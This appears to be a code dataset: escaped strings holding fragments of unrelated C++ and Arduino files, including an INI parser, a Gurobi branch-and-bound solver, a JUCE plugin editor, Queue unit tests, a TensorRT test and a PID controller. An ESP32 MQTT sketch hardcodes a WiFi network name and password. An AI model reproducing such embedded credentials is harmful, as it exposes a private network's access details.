\u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 \u0441\u0438\u043d\u0442\u0430\u043a\u0441\u0438\u0441\n\tincorrect_str = other.incorrect_str;  //\u0441\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0435 \u0441\u0442\u0440\u043e\u043a\u0438 \u0441 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u043c \u0441\u0438\u043d\u0442\u0430\u043a\u0441\u0438\u0441\u043e\u043c\n\n\t//\u0442\u0435\u043a\u0443\u0449\u0430\u044f \u0441\u0435\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0445\n\tcurrent_section_name = other.current_section_name; //\u0438\u043c\u044f \u0441\u0435\u043a\u0446\u0438\u0438\n\tcurrent_section_number = other.current_section_number; //\u043d\u043e\u043c\u0435\u0440 \u0441\u0435\u043a\u0446\u0438\u0438 = \u0438\u043d\u0434\u0435\u043a\u0441  \u044d\u0442\u043e\u0439 \u0441\u0435\u043a\u0446\u0438\u0438 \u0432 \u043c\u0430\u0441\u0441\u0438\u0432\u0435 variables_str_array\n\n\tsections_map = other.sections_map;\n\tother.sections_map = nullptr;\n\n\tvariables_str_array = other.variables_str_array;\n\tother.variables_str_array = nullptr;\n}\n\nini_parser& ini_parser::operator=(ini_parser&& other) noexcept   // \u043e\u043f\u0435\u0440\u0430\u0442\u043e\u0440 \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0430\u044e\u0449\u0435\u0433\u043e \u043f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u043d\u0438\u044f\n{\n\treturn *this = ini_parser(other);\n}\n\nstd::string ini_parser::delete_spaces(const std::string& src_str) //\u0443\u0434\u0430\u043b\u0438\u0442\u044c \u043f\u0440\u043e\u0431\u0435\u043b\u044b \u0438 \u0437\u043d\u0430\u043a\u0438 \u0442\u0430\u0431\u0443\u043b\u044f\u0446\u0438\u0438 \u0432 \u043d\u0430\u0447\u0430\u043b\u0435 \u0441\u0442\u0440\u043e\u043a\u0438\n{\n\tif (src_str == \"\") \treturn src_str; //\u043d\u0438\u0447\u0435\u0433\u043e \u043d\u0435 \u0434\u0435\u043b\u0430\u0442\u044c \u0441 \u043f\u0443\u0441\u0442\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u043e\u0439\n\n\tstd::string temp_str = \"\";\n\tint i = 0;\n\tbool is_beginning = true;\n\n\twhile ((src_str[i] != '\\n') &&\n\t\t(i < src_str.size()))\n\t{\n\t\tif (((src_str[i] == ' ') || (src_str[i] == '\\t')) && //\u0437\u043d\u0430\u043a\u0438 \u043f\u0440\u043e\u0431\u0435\u043b\u043e\u0432 \u0438 \u0442\u0430\u0431\u0443\u043b\u044f\u0446\u0438\u0438 \n\t\t\tis_beginning) //\u0432 \u043d\u0430\u0447\u0430\u043b\u0435 \u0441\u0442\u0440\u043e\u043a\u0438\n\t\t{\n\t\t\t++i; //\u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c\n\t\t}\n\t\telse\n\t\t{\n\t\t\ttemp_str += src_str[i];\n\t\t\tis_beginning = false;\n\t\t\t++i;\n\t\t}\n\t}\n\n\treturn temp_str;\n}\n\n//\u0438\u0441\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u044c \u0441\u0442\u0440\u043e\u043a\u0443: \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c\u044b\u0439 \u043a\u043e\u0440\u0442\u0435\u0436 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u043a\u043e\u0434 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0433\u043e, \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439 \u0438\u043b\u0438 \u0441\u0435\u043a\u0446\u0438\u0438, \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439\nstd::tuple<string_type, std::string, std::string> ini_parser::research_string(const std::string& src_str)\n{\n\tstring_type temp_string_type = string_type::invalid_;  //\u0441\u0442\u0440\u043e\u043a\u0430 \u043d\u0435\u0432\u0430\u043b\u0438\u0434\u043d\u0430\u044f\n\tstd::string temp_name = \"\"; //\u0438\u043c\u044f \u0441\u0435\u043a\u0446\u0438\u0438 \u0438\u043b\u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439\n\tstd::string temp_value = \"\"; //\u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439\n\n\tif (src_str == \"\") //\u043f\u0435\u0440\u0435\u0434\u0430\u043d\u043d\u0430\u044f \u0441\u0442\u0440\u043e\u043a\u0430 \u043f\u0443\u0441\u0442\u0430\u044f\n\t{\n\t\treturn std::make_tuple(string_type::empty_, temp_name, temp_value);\n\t}\n\n\tif (src_str[0] == ';') //\u043f\u0435\u0440\u0435\u0434\u0430\u043d\u043d\u0430\u044f \u0441\u0442\u0440\u043e\u043a\u0430 \u0446\u0435\u043b\u0438\u043a\u043e\u043c \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u043a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439\n\t{\n\t\treturn std::make_tuple(string_type::empty_, temp_name, temp_value);\n\t}\n\n\tif (src_str[0] == '[') //\u043f\u0435\u0440\u0435\u0434\u0430\u043d\u043d\u0430\u044f \u0441\u0442\u0440\u043e\u043a\u0430 \u043f\u0440\u0435\u0434\u043f\u043e\u043b\u043e\u0436\u0438\u0442\u0435\u043b\u044c\u043d\u043e \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0441\u0435\u043a\u0446\u0438\u0438\n\t{\n\t\tint end_pos = src_str.find(']'); //\u043d\u043e\u043c\u0435\u0440 \u0441\u0438\u043c\u0432\u043e\u043b\u0430 \u0437\u0430\u043a\u0440\u044b\u0432\u0430\u044e\u0449\u0435\u0439 \u0441\u043a\u043e\u0431\u043a\u0438\n\n\t\tif ((end_pos == std::string::npos) ||   //\u0437\u0430\u043a\u0440\u044b\u0432\u0430\u044e\u0449\u0435\u0439 \u0441\u043a\u043e\u0431\u043a\u0438 \u043d\u0435\u0442\n\t\t\t(end_pos == 1)) // ||\t\t\t\t\t//\u0438\u043c\u044f \u0441\u0435\u043a\u0446\u0438\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u043f\u0443\u0441\u0442\u044b\u043c\n\n\t\t{\n\t\t\treturn std::make_tuple(string_type::invalid_, temp_name, temp_value); //\u0432\u0435\u0440\u043d\u0443\u0442\u044c \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442 \u043e \u043d\u0435\u0432\u0430\u043b\u0438\u0434\u043d\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0435\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfor (int i = 1; i < end_pos; ++i)\n\t\t\t{\n\t\t\t\tif ((src_str[i] == ' ') || (src_str[i] == '\\t') || (src_str[i] == '.')) //\u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0441\u0435\u043a\u0446\u0438\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442\u044c \u043f\u0440\u043e\u0431\u0435\u043b\u043e\u0432, \u0437\u043d\u0430\u043a\u043e\u0432",
    "#include \"gurobi_c++.h\"\n#include \"bits/stdc++.h\"\n#include \"math.h\"\n#include <queue>\nusing namespace std;\n\n// EUs ESs\nint n, k; \n\n// Bandwidth between the terminal and the edge server\ndouble r_nk_e;\n\n// Bandwidth between the terminal and the cloud\ndouble r_nk_c;\n\n// query executability vector\nvector<vector<int>> e; \n\n// the amount of computation\n// the result size\nvector<int> c, w; \n\n// the computational capability\nvector<int> F;\n\n// Branch-and-Bound node\nstruct node\n{\n     double upper;\n     double lower;\n     int Nd_num;\n     std::vector<std::vector<int>> d;\n     std::vector<std::vector<int>> d_upper;\n};\n\nvoid processNode(queue<node>& Q, node& p, double& min_upper, vector<vector<int>>& best_D);\ndouble calcProblem(node &p);\ndouble calcTargetVal(node &p);\nvector<vector<int>> readMatrixFromFile(const string& filename, int rows, int cols);\nvector<int> readVectorFromFile(const string& filename, int size);\nvoid initializeParameters();\n\nint main(int argc,\n         char *argv[])\n{\n     initializeParameters();\n\n    // Output the values for verification\n    cout << \"Number of MUs (n): \" << n << \", Number of ECs (k): \" << k << endl;\n    \n    cout << \"Matrix e: \" << endl;\n    for (const auto& row : e) {\n        for (const auto& val : row) {\n            cout << val << \" \";\n        }\n        cout << endl;\n    }\n    \n    cout << \"Vector c: \";\n    for (const auto& val : c) {\n        cout << val << \" \";\n    }\n    cout << endl;\n    \n    cout << \"Vector w: \";\n    for (const auto& val : w) {\n        cout << val << \" \";\n    }\n    cout << endl;\n    \n    cout << \"Vector F: \";\n    for (const auto& val : F) {\n        cout << val << \" \";\n    }\n    cout << endl;\n\n     queue<node> Q;\n     node p;\n     p.Nd_num = 0;\n     p.d = {};\n     p.d_upper.assign(n, vector<int>(k, 0));\n     calcTargetVal(p);\n     double min_upper = p.upper;\n     vector<vector<int>> best_D;\n     cout << \"min_upper:\" << min_upper << endl;\n     Q.push(p);\n     while (!Q.empty())\n     {\n          p = Q.front();\n          Q.pop();\n          processNode(Q, p, min_upper, best_D);\n          \n     }\n\n     cout << \"bestD: \" << endl;\n     for (int i = 0; i < n; i++)\n     {\n          for (int j = 0; j < k; j++)\n          {\n               cout << best_D[i][j] << \" \";\n          }\n          cout << endl;\n     }\n     vector<vector<double>> f(n, vector<double>(k));\n     vector<double> fm(k);\n     for (int i = 0; i < k; i++)\n     {\n          for (int j = 0; j < n; j++)\n          {\n               fm[i] += best_D[j][i] * e[j][i] * sqrt(c[j]);\n          }\n     }\n     for (int i = 0; i < n; i++)\n     {\n          for (int j = 0; j < k; j++)\n          {\n               if (best_D[i][j] == 0)\n               {\n                    f[i][j] = 0;\n                    cout << f[i][j] << \" \";\n                    continue;\n               }\n               f[i][j] = F[j] * sqrt(c[i]) / fm[j];\n               cout << f[i][j] << \" \";\n          }\n          cout << endl;\n     }\n     cout << \"bestTarget: \" << min_upper << endl;\n\n     return 0;\n}\n\nvoid processNode(queue<node>& Q, node& p, double& min_upper, vector<vector<int>>& best_D) {\n    int index = p.Nd_num;\n    if (index >= n)\n        return;\n\n    vector<vector<int>> determinedD = p.d;\n    node p_cloud;\n    p_cloud.Nd_num = index + 1;\n    determinedD.push_back({0, 0});\n    p_cloud.d = determinedD;\n    calcProblem(p_cloud);\n    calcTargetVal(p_cloud);\n\n    if (min_upper > p_cloud.upper) {\n        min_upper = p_cloud.upper;\n        best_D = p_cloud.d_upper;\n    }\n\n    vector<node> p_edge;\n    for (int i = 0; i < k; i++) {\n        vector<int> T(k, 0);\n        if (e[index][i] == 1) {\n            T[i] = 1;\n            node p_e;\n            p_e.Nd_num = index + 1;\n            vector<vector<int>> determinedD_edge = p.d;\n            determinedD_edge.push_back(T);\n            p_e.d = determinedD_edge;\n            calcProblem(p_e);\n            calcTargetVal(p_e);\n\n            if (min_upper > p_e.upper) {\n                min_upper = p_e.upper;\n                best_D = p_e.d_upper;\n            }\n            p_edge.push_back(p_e);\n        }\n    }\n\n    if (p_cloud.lower <= min_upper)\n        Q.push(p_cloud);\n    \n    for (int i = 0; i < p_edge.size(); i++) {\n        if (p_edge[i].lower <= min_upper)\n            Q.push(p_edge[i]);\n    }\n}\n\ndouble calcTargetVal(node &p)\n{\n     std::vector<std::vector<int>> D_upper = p.d_upper;\n     double obj = 0.0;\n     for (int i = 0; i < k; i++)\n     {\n          double tmp = 0.0;\n          for (int j = 0; j < n; j++)\n          {\n               tmp += D_upper[j][i] * e[j][i] * sqrt(c[j]);\n          }\n          obj += tmp * tmp / F[i];\n     }\n     for (int i = 0; i < k; i++)\n     {\n          for (int j = 0; j < n; j++)\n          {\n               obj += D_upper[j][i] * e[j][i] * w[j] / r_nk_e;\n          }\n     }\n     for (int i = 0; i < n; i++)\n     {\n          int is_edge = 0.0;\n          for (int j = 0; j < k; j++)\n          {\n               is_edge += D_upper[i][j] * e[i][j];\n          }\n          if (is_edge == 0)\n             ",
    "/*\r\n  ==============================================================================\r\n\r\n    This file contains the basic framework code for a JUCE plugin editor.\r\n\r\n  ==============================================================================\r\n*/\r\n\r\n#include \"PluginProcessor.h\"\r\n#include \"PluginEditor.h\"\r\n\r\n//==============================================================================\r\nELALTOSPACESAudioProcessorEditor::ELALTOSPACESAudioProcessorEditor (ELALTOSPACESAudioProcessor& p)\r\n: AudioProcessorEditor (&p), audioProcessor (p), inLevelMeterL([&]() {return audioProcessor.getRmsValueIn(0); }), inLevelMeterR([&]() {return audioProcessor.getRmsValueIn(1); }), outLevelMeterL([&]() {return audioProcessor.getRmsValueOut(0); }), outLevelMeterR([&]() {return audioProcessor.getRmsValueOut(1); })\r\n{\r\n    //Calls PreparePlugin method\r\n    preparePlugin();\r\n    \r\n    //Control onClick method\r\n    roomsButtons[0]->onClick = [this]\r\n    {\r\n        // Flags for image display\r\n        drawControl = true;\r\n        drawLive = false;\r\n        drawPasillo = false;\r\n        \r\n        // Enables/disables options\r\n        comboBoxPlugin[0]->setEnabled(false);\r\n        comboBoxPlugin[1]->setEnabled(false);\r\n        comboBoxPlugin[2]->setEnabled(true);\r\n        \r\n        // Flags rooms buttons\r\n        if (roomsButtons[0]->getToggleState())\r\n        {\r\n            // Update IR params\r\n            audioProcessor.updateParametersIR();\r\n        }\r\n    };\r\n    \r\n    \r\n    //Live onClick method\r\n    roomsButtons[1]->onClick = [this]\r\n    {\r\n        //Flags for image display\r\n        drawControl = false;\r\n        drawLive = true;\r\n        drawPasillo = false;\r\n\r\n        //Enables/disables options\r\n        comboBoxPlugin[0]->setEnabled(true);\r\n        comboBoxPlugin[1]->setEnabled(true);\r\n        comboBoxPlugin[2]->setEnabled(false);\r\n        \r\n        //Flags rooms buttons\r\n        if (roomsButtons[1]->getToggleState())\r\n        {\r\n            // Update IR params\r\n            audioProcessor.updateParametersIR();\r\n        }\r\n    };\r\n    \r\n    //Pasillo onClick method\r\n    roomsButtons[2]->onClick = [this]\r\n    {\r\n        //Flags for image display\r\n        drawControl = false;\r\n        drawLive = false;\r\n        drawPasillo = true;\r\n\r\n        //Enables/disables options\r\n        comboBoxPlugin[0]->setEnabled(false);\r\n        comboBoxPlugin[1]->setEnabled(true);\r\n        comboBoxPlugin[2]->setEnabled(false);\r\n        \r\n        //Flags rooms buttons\r\n        if (roomsButtons[2]->getToggleState())\r\n        {\r\n            // Update IR params\r\n            audioProcessor.updateParametersIR();\r\n        }\r\n        \r\n    };\r\n    \r\n    ///Changes IR Control\r\n    comboBoxPlugin[2]->onChange = [this]\r\n    {\r\n        audioProcessor.updateParametersIR();\r\n    };\r\n    \r\n    ///Changes IR Live\r\n    comboBoxPlugin[0]->onChange = [this]\r\n    {\r\n        audioProcessor.updateParametersIR();\r\n    };\r\n    \r\n    comboBoxPlugin[1]->onChange = [this] ///Changes IR Passillo\r\n    {\r\n         audioProcessor.updateParametersIR();\r\n    };\r\n    \r\n//    ///Updates FILTER state\r\n//    stateFilter.onClick = [this]\r\n//    {\r\n//        audioProcessor.filterState = stateFilter.getToggleState();\r\n//    };\r\n//    \r\n    setSize (800, 700);\r\n}\r\n\r\nELALTOSPACESAudioProcessorEditor::~ELALTOSPACESAudioProcessorEditor()\r\n{\r\n}\r\n\r\n//==============================================================================\r\n\r\nvoid ELALTOSPACESAudioProcessorEditor::paint (juce::Graphics& g)\r\n{\r\n    ///Draws backroung image\r\n    g.drawImageWithin(background, 0, 0, getWidth(), getHeight(), juce::RectanglePlacement::stretchToFit);\r\n    \r\n    ///Redraws room image as selected\r\n    if (drawControl)\r\n        setRoomImg(controlImg, g);\r\n    else if (drawLive)\r\n        setRoomImg(liveImg, g);\r\n    else if (drawPasillo)\r\n        setRoomImg(pasilloImg, g);\r\n    \r\n    ///Draws Logo\r\n    changeSvgColor(*logoDrawable, ELALTOcolour2);\r\n    const auto logoX = getWidth()*(0.725f);\r\n    const auto logoY = getHeight()*(0.8f);\r\n    const auto logoW = getWidth()*(0.08);\r\n    const auto logoH = getHeight()*(0.075);\r\n    juce::Rectangle<float> destArea(logoX, logoY, logoW, logoH);\r\n    juce::RectanglePlacement placement(juce::RectanglePlacement::fillDestination);\r\n    logoDrawable->drawWithin(g, destArea, placement, 1.0f);\r\n        \r\n    ///Draws round rectangles\r\n    float cornerRoundness = 10.0;\r\n    float spaceBorders = 0.03; //as percentage\r\n    float spaceRectangles = 0.02; //as percentage\r\n    float r1Size = 0.45; //size of rectangle #1 as percentage\r\n    float r2Size = 0.25; //size of rectangle #2 as percentage\r\n    float r3Size = 0.3; //size of rectangle #3 as percentage\r\n    setRoundRectangles(g, spaceBorders, spaceRectangles, r1Size, r2Size, r3Size, cornerRoundness);\r\n}\r\n\r\nvoid ELALTOSPACESAudioProcessorEditor::resized()\r\n{\r\n    ///Adds dimensions to in/out objects\r\n    const auto labelX = getWidth()*0.095;\r\n    const auto labelY = getHeight()*0.05;\r\n    const auto labelW = 60;\r\n    const auto labelH = 20",
    "#include <gtest/gtest.h>\n#include \"Queue.cpp\"\n\n// TODO: Uncomment the following test\n\nTEST(QueueTest, InstantiateEmptyQueue)\n{\n    Queue<int> queue;\n    ASSERT_EQ(queue.size(), 0);\n}\nTEST(QueueTest, InstantiatQueue)\n{\n    Queue<int> queue;\n    queue.enqueue(5);\n    queue.enqueue(4);\n    queue.enqueue(3);\n    ASSERT_EQ(queue.dequeue(), 5);\n}\nTEST(QueueTest, EmptyQueue)\n{\n    Queue<int> queue;\n    ASSERT_EQ(queue.dequeue(), std::nullopt);\n}\nTEST(QueueTest, EnqueueDequeue)\n{\n    Queue<int> queue;\n    queue.enqueue(5);\n    queue.enqueue(4);\n    queue.enqueue(3);\n    ASSERT_EQ(queue.size(), 3);  \n    ASSERT_EQ(queue.dequeue(), 5); \n    ASSERT_EQ(queue.size(), 2);  \n    ASSERT_EQ(queue.dequeue(), 4); \n    ASSERT_EQ(queue.dequeue(), 3); \n    ASSERT_EQ(queue.size(), 0); \n    ASSERT_EQ(queue.dequeue(), std::nullopt); \n}\n\n\nTEST(QueueTest, DequeueFromEmptyQueue)\n{\n    Queue<int> queue;\n    ASSERT_EQ(queue.dequeue(), std::nullopt);  \n}\n\nTEST(QueueTest, SingleElementQueue)\n{\n    Queue<int> queue;\n    queue.enqueue(42);\n    ASSERT_EQ(queue.size(), 1);\n    ASSERT_EQ(queue.dequeue(), 42); \n    ASSERT_EQ(queue.size(), 0); \n    ASSERT_EQ(queue.dequeue(), std::nullopt);  \n}\n\nTEST(QueueTest, QueueWithDifferentDataTypes)\n{\n    Queue<std::string> queue;\n    queue.enqueue(\"first\");\n    queue.enqueue(\"second\");\n    queue.enqueue(\"third\");\n    ASSERT_EQ(queue.dequeue(), \"first\");\n    ASSERT_EQ(queue.dequeue(), \"second\");\n    ASSERT_EQ(queue.dequeue(), \"third\");\n    ASSERT_EQ(queue.size(), 0); \n}\n// TODO: add more tests for Queue below\n",
    "#include <iostream>\n#include <cassert>\n#include <NvInfer.h>\n#include <NvInferPlugin.h>\n#include <NvInferRuntime.h>\n#include <cuda_runtime.h>\n#include <vector>\n\n\nusing namespace nvinfer1;\n\nclass Logger : public nvinfer1::ILogger\n{\n    void log(Severity severity, const char* msg) noexcept override\n    {\n        if (severity <= Severity::kWARNING)\n            std::cout << msg << std::endl;\n    }\n} gLogger;\n\nusing namespace nvinfer1;\n\nvoid testAddPlugin() {\n    \n    IBuilder* builder = createInferBuilder(gLogger);\n    INetworkDefinition* network = builder->createNetworkV2(1U << static_cast<uint32_t>(nvinfer1::NetworkDefinitionCreationFlag::kEXPLICIT_BATCH));\n    \n    initLibNvInferPlugins(&gLogger, \"\");\n\n    // \u521b\u5efa\u8f93\u5165\u5f20\u91cf\n    auto input0 = network->addInput(\"input0\", DataType::kFLOAT, Dims{1, {1}});\n    auto input1 = network->addInput(\"input1\", DataType::kFLOAT, Dims{1, {1}});\n\n    std::vector<ITensor*> inputs = {input0, input1};\n\n\n    auto registry = getPluginRegistry();\n    int32_t num;\n    auto creators = registry->getPluginCreatorList(&num);\n\n    std::cout << \"TensorRT Plugin: num: \" << num << std::endl;\n    std::cout << \"==================================================\" << std::endl;\n\n    // for (int i = 0; i < num; ++i) {\n    //     auto creator = creators[i];\n    //     std::cout << \"\u63d2\u4ef6\u540d\u79f0: \" << creator->getPluginName() << std::endl;\n    //     std::cout << \"\u63d2\u4ef6\u7248\u672c: \" << creator->getPluginVersion() << std::endl;\n    //     std::cout << \"\u547d\u540d\u7a7a\u95f4: \" << creator->getPluginNamespace() << std::endl;\n    //     std::cout << \"--------------------------------------------------\" << std::endl;\n    // }\n\n\n\n    // \u521b\u5efa AddPlugin\n    auto creator = getPluginRegistry()->getPluginCreator(\"TestAddPlugin\", \"1\");\n\n\n    int num2 = 3;\n    PluginField pluginField[1] = { {\"flag\", &num2, PluginFieldType::kINT32, 1} };\n\n    PluginFieldCollection pluginData;\n    pluginData.nbFields = 1;\n    pluginData.fields = pluginField;\n    auto plugin = creator->createPlugin(\"TestAddPlugin\", &pluginData);\n\n    auto addLayer = network->addPluginV2(&inputs[0], 2, *plugin);\n    addLayer->getOutput(0)->setName(\"output\");\n    network->markOutput(*addLayer->getOutput(0));\n\n    \n    IBuilderConfig* config = builder->createBuilderConfig();\n    config->setMaxWorkspaceSize(1 << 20); // 1MB\n    ICudaEngine* engine = builder->buildEngineWithConfig(*network, *config);\n    \n\n    // network->destroy();\n    // builder->destroy();\n    // config->destroy();\n    // plugin->destroy();\n\n    // \u521b\u5efa\u6267\u884c\u4e0a\u4e0b\u6587\n    IExecutionContext* context = engine->createExecutionContext();\n\n    // \u51c6\u5907\u8f93\u5165\u6570\u636e\n    float h_input0 = 5.0f; // \u7b2c\u4e00\u4e2a\u6807\u91cf\n    float h_input1 = 3.0f; // \u7b2c\u4e8c\u4e2a\u6807\u91cf\n    float h_output = 0.0f; // \u8f93\u51fa\n\n    // \u5206\u914d\u8bbe\u5907\u5185\u5b58\n    float *d_input0, *d_input1, *d_output;\n    cudaMalloc(&d_input0, sizeof(h_input0));\n    cudaMalloc(&d_input1, sizeof(h_input1));\n    cudaMalloc(&d_output, sizeof(h_output));\n\n    // \u5c06\u8f93\u5165\u6570\u636e\u590d\u5236\u5230\u8bbe\u5907\n    cudaMemcpy(d_input0, &h_input0, sizeof(h_input0), cudaMemcpyHostToDevice);\n    cudaMemcpy(d_input1, &h_input1, sizeof(h_input1), cudaMemcpyHostToDevice);\n\n    // \u6267\u884c\u63a8\u7406\n    void* buffers[] = {d_input0, d_input1, d_output};\n    context->executeV2(buffers);\n\n    // \u5c06\u8f93\u51fa\u6570\u636e\u590d\u5236\u56de\u4e3b\u673a\n    cudaMemcpy(&h_output, d_output, sizeof(h_output), cudaMemcpyDeviceToHost);\n\n    // \u6253\u5370\u8f93\u51fa\u7ed3\u679c\n    std::cout << \"Output: \" << h_output << std::endl; // \u5e94\u8be5\u8f93\u51fa 8.0\n\n    // \u6e05\u7406\n    cudaFree(d_input0);\n    cudaFree(d_input1);\n    cudaFree(d_output);\n    context->destroy();\n    engine->destroy();\n}\n\nint main() {\n    testAddPlugin();\n    return 0;\n}",
    "/*\n  Basic ESP32 MQTT example\n  This sketch demonstrates the capabilities of the pubsub library in combination\n  with the ESP32 board/library.\n  It connects to an MQTT server then:\n  - publishes \"connected to MQTT\" to the topic \"outTopic\"\n  - subscribes to the topic \"inTopic\", printing out messages\n    it receives. NB - it assumes the received payloads are strings not binary\n  - If the \"ON\" payload is send to the topic \"inTopic\" , LED will be turned on, and acknowledgement will be send to Topic \"outTopic\"\n  - If the \"OFF\" payload is send to the topic \"inTopic\" , LED will be turned OFF, and acknowledgement will be send to Topic \"outTopic\"\n  It will reconnect to the server if the connection is lost using a\n  reconnect function.\n*/\n\n#include <WiFi.h>\n#include <PubSubClient.h>\n#include <Arduino.h>\n#include \"ESP32_Servo.h\"\n\nconst char* mqtt_server = \"test.mosquitto.org\"; //mqtt server\nconst char* ssid = \"WiFi_OliveNet-F7BFAC\";\nconst char* password = \"X4HmTsqD\";\n\nWiFiClient espClient;\nPubSubClient client(espClient); //lib required for mqtt\n\nServo miServo;\nconst int pinServo = 18;\n\nvoid callback(char* topic, byte* payload, unsigned int length) {   //callback includes topic and payload ( from which (topic) the payload is comming)\n  Serial.print(\"Message arrived [\");\n  Serial.print(topic);\n  Serial.print(\"] \");\n  for (int i = 0; i < length; i++)\n  {\n    Serial.print((char)payload[i]);\n  }\n  if ((char)payload[0] == 'O' && (char)payload[1] == 'N') //on\n  {\n    Serial.println(\"on\");\n    client.publish(\"SALIDA/01\", \"SERVO turned ON\");\n    miServo.attach(pinServo);\n    miServo.write(0); // Mover el servo a 0 grados\n    delay(1000);\n    miServo.detach();\n    delay(1000);\n    miServo.attach(pinServo); // Esperar 1 segundo\n    miServo.write(180);       // Mover el servo a 90 grados\n    delay(1000);              // Esperar 1 segundo\n    miServo.detach();\n\n  }\n  else if ((char)payload[0] == 'O' && (char)payload[1] == 'F' && (char)payload[2] == 'F') //off\n  {\n\n  }\n  Serial.println();\n}\nvoid reconnect() {\n  while (!client.connected()) {\n    Serial.println(\"Attempting MQTT connection...\");\n    if (client.connect(\"ESP32_clientID\")) {\n      Serial.println(\"connected\");\n      // Once connected, publish an announcement...\n      client.publish(\"SALIDA/01\", \"Nodemcu connected to MQTT\");\n      // ... and resubscribe\n      client.subscribe(\"Entrada/01\");\n\n    } else {\n      Serial.print(\"failed, rc=\");\n      Serial.print(client.state());\n      Serial.println(\" try again in 5 seconds\");\n      // Wait 5 seconds before retrying\n      delay(5000);\n    }\n  }\n}\nvoid connectmqtt()\n{\n  client.connect(\"ESP32_clientID\");  // ESP will connect to mqtt broker with clientID\n  {\n    Serial.println(\"connected to MQTT\");\n    // Once connected, publish an announcement...\n\n    // ... and resubscribe\n    client.subscribe(\"Entrada/01\"); //topic=Demo\n    client.publish(\"SALIDA/01\",  \"connected to MQTT\");\n\n    if (!client.connected())\n    {\n      reconnect();\n    }\n  }\n}\nvoid setup()\n{\n  Serial.begin(115200);\n    Serial.print(\"Conect\u00e1ndose a \");\n  Serial.println(ssid);\n\n  WiFi.begin(ssid, password);\n\n  while (WiFi.status() != WL_CONNECTED)\n  {\n    Serial.print(\".\");\n    delay(500);\n  }\n  Serial.println(\"\");\n  Serial.println(\"Conectado a WiFi\");\n  Serial.println(\"Direcci\u00f3n IP: \");\n  Serial.println(WiFi.localIP());\n\n  Serial.println(\"connected\");\n  client.setServer(mqtt_server, 1883);//connecting to mqtt server\n  client.setCallback(callback);\n  //delay(5000);\n  connectmqtt();\n}\n\n\nvoid loop()\n{\n  // put your main code here, to run repeatedly:\n  if (!client.connected())\n  {\n    reconnect();\n  }\n\n  client.loop();\n}\n",
    "#include \"PIDController.h\"\n\n/**\n * @brief Construct a new PIDController object\n * @details Initializes the PIDController with specified gain values and setpoint.\n *          Sets the initial previous error and total error to zero.\n * @param kp The proportional gain.\n * @param ki The integral gain.\n * @param kd The derivative gain.\n * @param setpoint_value The desired setpoint for the PID controller.\n */\nPIDController::PIDController(double kp, double ki, double kd, double setpoint_value) {\n  // Initialize the gains and setpoint\n  _Kp = kp;          // Set the proportional gain\n  _Ki = ki;          // Set the integral gain\n  _Kd = kd;          // Set the derivative gain\n  _setpoint = setpoint_value;  // Set the desired setpoint\n  _previous_error = 0.0;       // Initialize previous error to zero\n  _total_error = 0.0;          // Initialize total error to zero\n}\n\n/**\n * @brief Compute the PID output\n * @details Calculate the PID output using the current angle and \n *          the gains Kp, Ki, Kd. The output is calculated as P + I + D\n *          where P is the proportional term, I is the integral term, and\n *          D is the derivative term.\n * @param current_angle The current angle of the robot\n * @return The PID output\n */\ndouble PIDController::compute(double current_angle) {\n  double error = _setpoint - current_angle;\n\n  // Calculate the proportional term\n  double P = _Kp * error;\n\n  // Calculate the integral term\n  _total_error += error;\n  double I = _Ki * _total_error;\n\n  // Calculate the derivative term\n  double derivative = error - _previous_error;\n  double D = _Kd * derivative;\n\n  // Calculate the PID output\n  double output = P + I + D;\n\n  // Update the previous error\n  _previous_error = error;\n\n  return output;\n}\n\n/**\n * @brief Set the proportional gain\n * @details Set the proportional gain of the PID controller. The\n *          proportional gain is used to calculate the proportional\n *          term of the PID output. The proportional term is\n *          calculated as KP * error where error is the difference\n *          between the setpoint and the current angle.\n * @param kp The proportional gain\n */\nvoid PIDController::setKp(double kp) {\n  _Kp = kp;\n}\n\n/**\n * @brief Set the integral gain\n * @details Set the integral gain of the PID controller. The\n *          integral gain is used to calculate the integral term\n *          of the PID output. The integral term is calculated as\n *          KI * total_error where total_error is the sum of all\n *          errors since the last time the integral term was\n *          calculated.\n * @param ki The integral gain\n */\nvoid PIDController::setKi(double ki) {\n  _Ki = ki;\n}\n\n/**\n * @brief Set the derivative gain\n * @details Set the derivative gain of the PID controller. The\n *          derivative gain is used to calculate the derivative term\n *          of the PID output. The derivative term is calculated as\n *          KD * (current_error - previous_error)\n * @param kd The derivative gain\n */\nvoid PIDController::setKd(double kd) {\n  _Kd = kd;\n}\n\n/**\n * 